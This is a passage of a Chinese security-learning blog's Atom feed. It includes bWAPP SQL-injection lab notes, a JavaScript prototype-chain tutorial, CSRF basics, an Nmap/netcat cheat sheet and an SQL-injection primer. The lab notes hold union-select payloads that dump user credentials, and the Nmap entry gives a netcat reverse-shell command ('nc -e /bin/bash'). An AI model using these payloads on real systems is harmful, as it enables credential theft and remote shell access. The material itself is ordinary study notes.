class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span><span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,database(),version(),user(),5,6,7#</span></span><br></pre></td></tr></table></figure><p><img src="..%5Cimgs%5Cweb%5Cbwapp-6.png"><br><img src="..%5Cimgs%5Cweb%5Cbwapp-7.png"></p></li><li><p>使用同样的构造方法可以确认出表名、数据库名,用户名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>(),<span class="keyword">user</span>(),table_name,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">from</span> information_schema.tables<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,login,Password,email,secret,6,7 from users#</span></span><br></pre></td></tr></table></figure></li></ol><p>也可以直接用<code>sqlmap</code>跑出来</p><p><code>sqlmap -u &quot;http://192.168.50.151/sqli_1.php?title=aaa&amp;action=search&quot;</code></p><h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p>对输入的数据进行了<code>addslashes</code>处理，<code>addslashes</code>只会对<code>&#39; &quot; \</code>进行转义操作，绕过方式</p><ol><li>宽字节注入（数据库默认是latin1编码，要想注入成功，需要将编码改为GBK）</li><li>编码解码导致的绕过（原因是字符串在带入查询前，被做了一些编码解码操作而没有再做一次过滤）</li></ol><h2 id="后面的大致思路都差不多"><a href="#后面的大致思路都差不多" class="headerlink" title="后面的大致思路都差不多"></a>后面的大致思路都差不多</h2>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;网络上相关的笔记也很多，但有些地方感觉还是得说得更清楚一些&lt;/p&gt;
+&lt;h2 id=&quot;HTML-Injection-Reflection-Get&quot;&gt;&lt;a href=&quot;#HTML-Injection-Reflection-Get&quot; class=&quot;headerlink&quot; titl</summary>
+      
+    
+    
+    
+    
+    <category term="bwapp、injection" scheme="http://yejuns.github.io/tags/bwapp%E3%80%81injection/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>js原型链</title>
+    <link href="http://yejuns.github.io/2020/12/31/js%E5%8E%9F%E5%9E%8B%E9%93%BE/"/>
+    <id>http://yejuns.github.io/2020/12/31/js%E5%8E%9F%E5%9E%8B%E9%93%BE/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-01T03:21:56.544Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><h3 id="原型链最重要的是记住这三点"><a href="#原型链最重要的是记住这三点" class="headerlink" title="原型链最重要的是记住这三点"></a>原型链最重要的是记住这三点</h3><blockquote><ol><li><code>__proto__</code>、 <code>constructor</code> 属性是对象所独有的；</li><li><code>prototype</code> 属性是函数独有的；</li><li>上面说过js中函数也是对象的一种，那么函数同样也有属性<code>__proto__</code>、 <code>constructor</code>；</li><li>也就是说，普通对象（比如 {a:1}）没有prototype属性—不明白</li></ol></blockquote><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li>想要弄清楚原型和原型链，这几个属性必须要搞清楚，<code>__proto__</code> 、<code>prototype</code> 、 <code>constructor</code>。</li><li>其次你要知道js中对象和函数的关系，函数其实是对象的一种。</li><li>最后你要知道函数、构造函数的区别，任何函数都可以作为构造函数，但是并不能将任意函数叫做构造函数，只有当一个函数通过new关键字调用的时候才可以成为构造函数。如：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Parent = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义一个函数，那它只是一个普通的函数，下面我们让这个函数变得不普通</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Parent();</span><br><span class="line"><span class="comment">//这时这个Parent就不是普通的函数了，它现在是一个构造函数。因为通过new关键字调用了它</span></span><br><span class="line"><span class="comment">//创建了一个Parent构造函数的实例 p1</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="prototype属性"><a href="#prototype属性" class="headerlink" title="prototype属性"></a>prototype属性</h2><p>它是函数独有的属性，从一个函数指向另一个对象，代表这个对象是这个函数的原型对象，这个对象也是当前函数所创建的实例的原型对象。<br>prototype设计之初就是为了实现继承，让由特定函数创建的所有实例共享属性和方法，也可以说是让某一个构造函数实例化的所有对象可以找到公共的方法和属性。有了prototype我们不需要为每一个实例创建重复的属性方法，而是将属性方法创建在构造函数的原型对象上（prototype）。那些不需要共享的才创建在构造函数中。<br>继续引用上面的代码，当我们想为通过Parent实例化的所有实例添加一个共享的属性时，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parent.prototype.name &#x3D; &quot;我是原型属性，所有实例都可以读取到我&quot;;</span><br></pre></td></tr></table></figure><p>这就是原型属性，当然也可以添加原型方法。那问题来了，p1怎么知道他的原型对象上有这个方法呢，往下看↓↓↓</p><h2 id="proto属性"><a href="#proto属性" class="headerlink" title="proto属性"></a>proto属性</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__proto__属性相当于指向prototype唯一的指针</span><br></pre></td></tr></table></figure><p><code>__proto__</code> 属性告诉我们一个对象的原型是什么.</p><p>我们说了，Parent.prototype上添加的属性和方法叫做原型属性和原型方法，该构造函数的实例都可以访问调用。那这个构造函数的原型上的属性和方法，怎么能和构造函数的实例联系在一起呢，就是通过__proto__属性。每个对象都有__proto__属性，该属性指向的就是该对象的原型。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1.__proto__ === Parent.prototype; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><ul><li>p1.prototype 是错误的<br>(可以理解为，在new出一个实例对象后，需要让new出的对象可以指向原型，因此设置了_proto_属性)</li></ul><p><code>__proto__</code>通常称为隐式原型，<code>prototype</code>通常称为显式原型，那我们可以说一个对象的隐式原型指向了该对象的构造函数的显式原型。那么我们在显式原型上定义的属性方法，通过隐式原型传递给了构造函数的实例。这样一来实例就能很容易的访问到构造函数原型上的方法和属性了。<br>我们之前也说过<code>__proto__</code>属性是对象（包括函数）独有的，那么<code>Parent.prototype</code>也是对象，那它有隐式原型么？又指向谁？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parent.prototype.__proto__ === <span class="built_in">Object</span>.prototype; <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>可以看到，构造函数的原型对象上的隐式原型对象指向了Object的原型对象。那么Parent的原型对象就继承了Object的原型对象。由此我们可以验证一个结论，万物继承自Object.prototype。这也就是为什么我们可以实例化一个对象，并且可以调用该对象上没有的属性和方法了。如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//我们并没有在Parent中定义任何方法属性，但是我们可以调用</span></span><br><span class="line">p1.toString();<span class="comment">//hasOwnProperty 等等的一些方法</span></span><br></pre></td></tr></table></figure><p>我们可以调用很多我们没有定义的方法，这些方法是哪来的呢？现在引出原型链的概念，当我们调用p1.toString()的时候，先在p1对象本身寻找，没有找到则通过p1.__proto__找到了原型对象Parent.prototype，也没有找到，又通过Parent.prototype.__proto__找到了上一层原型对象Object.prototype。在这一层找到了toString方法。返回该方法供p1使用。</p><p>当然如果找到Object.prototype上也没找到，就在Object.prototype.__proto__中寻找，但是<code>Object.prototype.__proto__ === null</code>所以就返回undefined。这就是为什么当访问对象中一个不存在的属性时，返回undefined了。</p><h2 id="constructor属性"><a href="#constructor属性" class="headerlink" title="constructor属性"></a>constructor属性</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">age</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> per1 = <span class="keyword">new</span> Person(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">var</span> per2 = <span class="keyword">new</span> Person(<span class="number">13</span>);</span><br></pre></td></tr></table></figure><p>上面的例子中per1、per2都是Person的实例，这两个实例都有一个constructor属性，该属性（是一个指针）指向Person。（要把Person（）看成是构造函数）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(per1.constructor &#x3D;&#x3D; per2.constructor &#x3D;&#x3D; Person); &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><p>函数的<code>prototype</code>对象都包含一个<code>constructor</code>的属性，<code>constructor</code>指向当前构造函数</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;重点&quot;&gt;&lt;a href=&quot;#重点&quot; class=&quot;headerlink&quot; title=&quot;重点&quot;&gt;&lt;/a&gt;重点&lt;/h2&gt;&lt;h3 id=&quot;原型链最重要的是记住这三点&quot;&gt;&lt;a href=&quot;#原型链最重要的是记住这三点&quot; class=&quot;headerlink&quot; title=</summary>
+      
+    
+    
+    
+    
+    <category term="javaScript" scheme="http://yejuns.github.io/tags/javaScript/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之CSRF</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BCSRF/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BCSRF/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-24T00:42:16.623Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>数据包的中Cookie 的值是浏览器从本地存储中取出，并自动填充到数据包中。</p><p>如果攻击者控制了用户浏览器并且窃取了cookie。</p><p>浏览器会自动完成Cookie 的填充，目标网站会误认为该数据包就是管理员发送的，会以管理员的权限进行相关的操作。</p><h2 id="CSRF的原因"><a href="#CSRF的原因" class="headerlink" title="CSRF的原因"></a>CSRF的原因</h2><p>HTTP 是一种无状态协议，即服务器不会保留与客户交易时的状态。</p><p>用户A 在很短的时间间隔内向Web服务器发送了两次同样的请求，服务器并不会因为已经响应了该请求一次就不对第二次请求进行响应，因为服务器并不知道已经响应过一次该请求。</p><p>假设用户在网站A的某一个页面上已经完成了登录操作，当在该网站的另一个页面上执行的操作需要验证用户登录的时候任然需要用户再次登录，因为HTTP 并不知道你已经登录，它不会维持你的登录状态。</p><p>为了让服务器能够记住用户引入了Cookie 机制。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;CSRF&quot;&gt;&lt;a href=&quot;#CSRF&quot; class=&quot;headerlink&quot; title=&quot;CSRF&quot;&gt;&lt;/a&gt;CSRF&lt;/h2&gt;&lt;p&gt;数据包的中Cookie 的值是浏览器从本地存储中取出，并自动填充到数据包中。&lt;/p&gt;
+&lt;p&gt;如果攻击者控制了用户浏览器并且窃</summary>
+      
+    
+    
+    
+    
+    <category term="CSRF 、攻击" scheme="http://yejuns.github.io/tags/CSRF-%E3%80%81%E6%94%BB%E5%87%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之Nmap使用</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BNMap%E4%BD%BF%E7%94%A8/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BNMap%E4%BD%BF%E7%94%A8/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-29T11:03:25.948Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmap是被专业人员广泛使用的一款功能全面的端口扫描工具</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>kali上已经自带，windows上去官网下载相关的安装包，centos就直接 <code>yum install nmap</code></p><h3 id="简单入门"><a href="#简单入门" class="headerlink" title="简单入门"></a>简单入门</h3><p>刚开始使用的时候可能会因为信息量太大无从下手，最简单的使用就是 <code>nmap your-ip（域名）</code> 就可以扫描出其对外开放的服务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.13</span><br><span class="line"><span class="meta">#</span><span class="bash">基本格式，会扫描该主机的所有端口</span></span><br><span class="line"></span><br><span class="line">nmap -p 8080 192.168.31.13</span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断指定ip是否开放指定端口</span> </span><br><span class="line"></span><br><span class="line">nmap  -p 22,21,80 192.168.31.13</span><br><span class="line">nmap  -p 22,21,80 192.168.31.1-253</span><br><span class="line"><span class="meta">#</span><span class="bash"> 增加端口和网段</span> </span><br><span class="line"></span><br><span class="line">nmap 192.168.31.1/24</span><br><span class="line"><span class="meta">#</span><span class="bash"> 扫描整个子网的端口，这个过程可能会比较久</span></span><br></pre></td></tr></table></figure><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><p>Nmap扫描相关端口后，会显示出各个端口的状态，一共有6种</p><ol><li>Open，开放状态（当nmap使用TCP SYN对目标主机某一范围的端口进行扫描时，我们知道 TCP SYN报文是TCP建立连接的第一步，所以，如果目标主机返回SYN+ACK的报文，我们就认为此端口开放了并且使用了TCP服务）</li><li>Closed，关闭状态（TCP SYN类型的扫描，如果返回RST类型的报文，则端口处于管理状态。这里我们值得注意的是关闭的端口也是可访问的，只是没有上层的服务在监听这个端口）</li><li>Filtered(过滤的)，由于报文无法到达指定的端口，nmap不能够决定端口的开放状态，这主要是由于网络或者主机安装了一些防火墙所导致</li><li>Unfiltered(未被过滤的), 虽然可以访问到指定端口，但Nmap不能确定该端口是否处于开放状态。</li><li>Open|filtered  Nmap认为指定端口处于开放状态或过滤状态，这种状态只会出现在open端口对报文不做回应的扫描类型中，如：udp，ip protocol ，TCP null，fin，和xmas扫描类型</li><li>Closed|filtered Nmap认为指定端口处于开放状态或未过滤状态，</li></ol><p>以下是一些例子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 192.168.31.13 -p 8080</span><br><span class="line"><span class="meta">#</span><span class="bash">操作系统检测（-O）</span></span><br><span class="line"></span><br><span class="line">nmap  -Pn 80 192.168.31.13</span><br><span class="line"><span class="meta">#</span><span class="bash"> 禁用主机检测（-Pn）,如果主机屏蔽了ping请求，Nmap可能会认为该主机没有开机。这将使得Nmap无法进行进一步检测，禁用Nmap的主机检测功能后。Nmap会认为目标主机已经开机并进行全套的检测工作</span></span><br><span class="line"></span><br><span class="line">nmap -A 192.168.31.13 -p 8080</span><br><span class="line"><span class="meta">#</span><span class="bash"> 强力检测选项（-A），Nmap将检测目标主机的下述信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务版本识别（-sV）；操作系统识别（-O）；脚本扫描（-sC）</span></span><br><span class="line"></span><br><span class="line">nmap -sT 192.168.31.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行完整的三次 握手。如果成功建立连接，则判定该端口是开放端口。由于在检测每个端口时都需要进行三次握手，所以这种扫描方式比较慢，而且扫描行为很可能被目标主机记录下来</span></span><br><span class="line"></span><br><span class="line">nmap -sS 192.168.31.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> SYN扫描（-sS）：该选项也称为半开连接或者SYN stealth。采用该选项后，Nmap将使用 含有SYN标志位的数据包进行端口探测。如果目标主机回复了SYN/ACK包，则说明该端口处 于开放状态：如果回复的是RST/ACK包，则说明这个端口处于关闭状态；如果没有任何响应 或者发送了ICMP unreachable信息，则可认为这个端口被屏蔽了。SYN模式的扫描速度非常 好。而且由于这种模式不会进行三次握手，所以是一种十分隐蔽的扫描方式</span></span><br><span class="line"></span><br><span class="line">namp -sN 192.168.31.1</span><br><span class="line">namp -sF 192.168.31.1</span><br><span class="line"><span class="meta">#</span><span class="bash">TCP NULL（-sN）、FIN（-sF）及XMAS（-sX）扫描：NULL 扫描不设置任何控制位； FIN扫描仅设置FIN标志位：XMAS扫描设置FIN、PSH和URG的标识位。如果目标主机返回 了含有RST标识位的响应数据，则说明该端口处于关闭状态；如果目标主机没有任何回应， 则该端口处于打开｜过滤状态。</span></span><br></pre></td></tr></table></figure><h3 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h3><p><code>nmap -sU 192.168.1.1</code> <br><br>Nmap有多种TCP扫描方式，而UDP扫描仅有一种扫描方式（-sU）。虽然UDP扫描结果没有 TCP扫描结果的可靠度高，但渗透测试人员不能因此而轻视UDP扫描，毕竟UDP端口代表着 可能会有价值的服务端程序。但是UDP扫描的最大问题是性能问题。由干Linux内核限制1秒内最多发送一次ICMP Port Unreachable信息。按照这个速度，对一台主机的65536个UDP端口进行完整扫描，总耗时必 定会超过18个小时。</p><p>优化方法主要是:</p><ol><li>进行并发的UDP扫描；</li><li>优先扫描常用端口；</li><li>在防火墙后面扫描；</li><li>启用–host-timeout选项以跳过响应过慢的主机。</li></ol><p>假如我们需要找到目标主机开放了哪些 UDP端口。为提高扫描速度，我们仅扫描 53端口 （DNS）和161端口（SNMP）</p><p>使用命令  <code>nmap -sU 192.168.56.103 -p 53,161</code></p><h3 id="目标端口选项"><a href="#目标端口选项" class="headerlink" title="目标端口选项"></a>目标端口选项</h3><p>默认情况下，Nmap将从每个协议的常用端口中随机选择1000个端口进行扫描。其nmapservices文件对端口的命中率进行了排名。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-p端口范围：只扫描指定的端口。扫描1〜1024号端口，可设定该选项为–p1-1024。扫描1 〜65535端口时，可使用-p-选项。</span><br><span class="line"></span><br><span class="line">-F（快速扫描）：将仅扫描100个常用端口。</span><br><span class="line"></span><br><span class="line">-r（顺序扫描）：指定这个选项后，程序将从按照从小到大的顺序扫描端口。</span><br><span class="line"></span><br><span class="line">-top-ports &lt;1 or=&quot;&quot;greater=&quot;&quot;&gt;：扫描nmap-services里排名前N的端口。</span><br></pre></td></tr></table></figure><p>Nmap还提供了脚本引擎功能（Nmap Scripting Engine，NSE）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65000 -sV 192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash">扫描目标ip的1-65000端口，并进行服务版本识别</span></span><br></pre></td></tr></table></figure><h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><p>由于Nmap中提供了Ncat功能，Ncat包含NetCat的所有功能</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 80       #监听本机的TCP80端口</span><br><span class="line">nc -nvv 192.168.x.x 80    #连到192.168.x.x的TCP80端口</span><br><span class="line"></span><br><span class="line">nc -e /bin/bash 192.168.0.1 33</span><br><span class="line"><span class="meta">#</span><span class="bash"> 绑定到192.168.0.1的33端口，并反弹一个自己的shell到远程主机</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Nmap&quot;&gt;&lt;a href=&quot;#Nmap&quot; class=&quot;headerlink&quot; title=&quot;Nmap&quot;&gt;&lt;/a&gt;Nmap&lt;/h2&gt;&lt;p&gt;Nmap是被专业人员广泛使用的一款功能全面的端口扫描工具&lt;/p&gt;
+&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; cla</summary>
+      
+    
+    
+    
+    
+    <category term="web安全、Nmap" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8%E3%80%81Nmap/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之RCE</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BRCE%20/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BRCE%20/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-05-19T16:10:40.796Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>程序对输入检测不到位，导致攻击者可以执行非预期的代码和系统命令，从而能够获取Webshell。</p><p>在nodejs项目中，如果出现模板注入攻击，往往会升级为RCE</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;RCE&quot;&gt;&lt;a href=&quot;#RCE&quot; class=&quot;headerlink&quot; title=&quot;RCE&quot;&gt;&lt;/a&gt;RCE&lt;/h2&gt;&lt;p&gt;程序对输入检测不到位，导致攻击者可以执行非预期的代码和系统命令，从而能够获取Webshell。&lt;/p&gt;
+&lt;p&gt;在nodejs项目中，</summary>
+      
+    
+    
+    
+    
+    <category term="xss、攻击" scheme="http://yejuns.github.io/tags/xss%E3%80%81%E6%94%BB%E5%87%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之SQL注入一</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-1/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-1/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-07T08:46:00.915Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h2><p>是发生于<code>应用程序与数据库层</code>的安全漏洞</p><p>网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。</p><h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> </span><br><span class="line"><span class="comment"># 用户输入，用 1 or 1=1 代替 1</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="comment"># 最后产生的效果类似 select id,name from test</span></span><br><span class="line"><span class="comment"># 实现了一个越权操作</span></span><br></pre></td></tr></table></figure><h3 id="常用的数据库操作"><a href="#常用的数据库操作" class="headerlink" title="常用的数据库操作"></a>常用的数据库操作</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>();    <span class="comment"># 显示数据库版本</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>();   <span class="comment"># 查看当前正在使用的数据库</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();       <span class="comment"># 查看使用当前数据库的用户</span></span><br><span class="line"><span class="keyword">select</span> @@datadir;    <span class="comment"># 查看数据库路径</span></span><br><span class="line"><span class="keyword">select</span> @@version_compile_os <span class="comment"># 查看数据库安装的操作系统</span></span><br></pre></td></tr></table></figure><h3 id="渗透过程中使用的数据库和表"><a href="#渗透过程中使用的数据库和表" class="headerlink" title="渗透过程中使用的数据库和表"></a>渗透过程中使用的数据库和表</h3><p><code>information_schema</code> ，是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等</p><ol><li><code>SCHEMATA</code>表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表</li><li><code>TABLES</code>表：提供了关于数据库中的表的信息（包括视图）</li><li><code>COLUMNS</code>表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。</li></ol><h3 id="常用构造注入方法"><a href="#常用构造注入方法" class="headerlink" title="常用构造注入方法"></a>常用构造注入方法</h3><p>使用union语句，<code>select 1,2 union select 1,2</code></p><h2 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h2><h3 id="按网络协议分"><a href="#按网络协议分" class="headerlink" title="按网络协议分"></a>按网络协议分</h3><ol><li>get注入</li><li>post注入</li></ol><h3 id="按注入的方式分"><a href="#按注入的方式分" class="headerlink" title="按注入的方式分"></a>按注入的方式分</h3><ol><li>Boolean-based blind SQL injection（布尔型注入）<br>     例如： <a href="http://test.com/view?id=1">http://test.com/view?id=1</a> and substring(version(),1,1)=5</li><li>UNION query SQL injection（可联合查询注入）, <br>                    例如：使用union语句，<code>select 1,2 union select 1,2</code></li><li>Time-based blind SQL injection（基于时间延迟注入），<br> 例如：使用sleep(3)函数，select * from user where id= ‘4’ and sleep(3)</li><li>Error-based SQL injection（报错型注入）</li><li>Stacked queries SQL injection（可多语句查询注入）</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;SQL注入的原理&quot;&gt;&lt;a href=&quot;#SQL注入的原理&quot; class=&quot;headerlink&quot; title=&quot;SQL注入的原理&quot;&gt;&lt;/a&gt;SQL注入的原理&lt;/h2&gt;&lt;p&gt;是发生于&lt;code&gt;应用程序与数据库层&lt;/code&gt;的安全漏洞&lt;/p&gt;
+&lt;p&gt;网站内部直接发</summary>
+      
+    
+    
+    
+    
+    <category term="SQL注入" scheme="http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之SQL注入-其他方式</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E5%85%B6%E4%BB%96%E6%96%B9%E5%BC%8F/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E5%85%B6%E4%BB%96%E6%96%B9%E5%BC%8F/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-24T01:23:36.256Z</updated>
+    
